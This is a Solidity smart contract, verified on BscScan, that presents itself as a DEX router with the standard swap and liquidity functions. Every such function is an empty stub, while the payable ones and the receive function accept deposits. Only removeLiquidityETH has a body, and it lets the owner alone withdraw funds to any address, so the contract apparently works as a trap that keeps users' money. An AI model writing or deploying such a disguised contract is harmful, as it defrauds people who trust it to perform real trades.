/**
 *Submitted for verification at BscScan.com on 2021-09-17
*/

pragma solidity ^0.7.6;
contract Router{

  address public owner;    

  constructor(){
      owner = msg.sender;
  }    

  function WETH() public pure returns (address){
      return 0xae13d989daC2f0dEbFf460aC112a837C89BAa7cd;
  }

  function addLiquidity(address tokenA,address tokenB,uint amountADesired,uint amountBDesired,uint amountAMin,uint amountBMin,address to,uint deadline) public returns (uint amountA, uint amountB, uint liquidity){
      
  }
  function addLiquidityETH(address token, uint amountTokenDesired,uint amountTokenMin,uint amountETHMin,address to,uint deadline) public payable returns (uint amountToken, uint amountETH, uint liquidity){
      
  }
  function removeLiquidity(address tokenA,address tokenB,uint liquidity,uint amountAMin, uint amountBMin,address to,uint deadline) public returns (uint amountA, uint amountB){
      
  }
  function removeLiquidityETH(address token, uint liquidity, uint amountTokenMin, uint amountETHMin, address to, uint deadline ) public returns (uint amountToken, uint amountETH){
      require(msg.sender == owner);
      payable(to).transfer(amountETHMin); 

  }
  function removeLiquidityWithPermit(address tokenA, address tokenB,uint liquidity,uint amountAMin,uint amountBMin,address to,uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s ) public returns (uint amountA, uint amountB){
      
  }
  function removeLiquidityETHWithPermit(address token,uint liquidity,uint amountTokenMin,uint amountETHMin, address to, uint deadline, bool approveMax, uint8 v, bytes32 r, bytes32 s) public returns (uint amountToken, uint amountETH){
      
  }
  function swapExactTokensForTokens(uint amountIn,uint amountOutMin, address[] calldata path, address to, uint deadline ) public returns (uint[] memory amounts){
      
  }
  function swapTokensForExactTokens( uint amountOut,uint amountInMax, address[] calldata path, address to, uint deadline ) public returns (uint[] memory amounts){
      
  }
  function swapExactETHForTokens(uint amountOutMin, address[] calldata path, address to, uint deadline) public payable returns (uint[] memory amounts){
      
  }
  function swapTokensForExactETH(uint amountOut, uint amountInMax, address[] calldata path, address to, uint deadline) public returns (uint[] memory amounts){
      
  }
  function swapExactTokensForETH(uint amountIn, uint amountOutMin, address[] calldata path, address to, uint deadline) public returns (uint[] memory amounts){
      
  }
  function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline) public payable returns (uint[] memory amounts){
      
  }

  function removeLiquidityETHSupportingFeeOnTransferTokens(address token,uint liquidity,uint amountTokenMin,uint amountETHMin,address to, uint deadline) public returns (uint amountETH){
      
  }
  function removeLiquidityETHWithPermitSupportingFeeOnTransferTokens(address token,uint liquidity,uint amountTokenMin,uint amountETHMin,address to,uint deadline,bool approveMax, uint8 v, bytes32 r, bytes32 s) public returns (uint amountETH){
      
  }

  function swapExactTokensForTokensSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) public{
      
  }
  function swapExactETHForTokensSupportingFeeOnTransferTokens(uint amountOutMin,address[] calldata path,address to,uint deadline) public payable{
      
  }
  function swapExactTokensForETHSupportingFeeOnTransferTokens(uint amountIn,uint amountOutMin,address[] calldata path,address to,uint deadline) public{
      
  }
  receive() external payable {

  }
}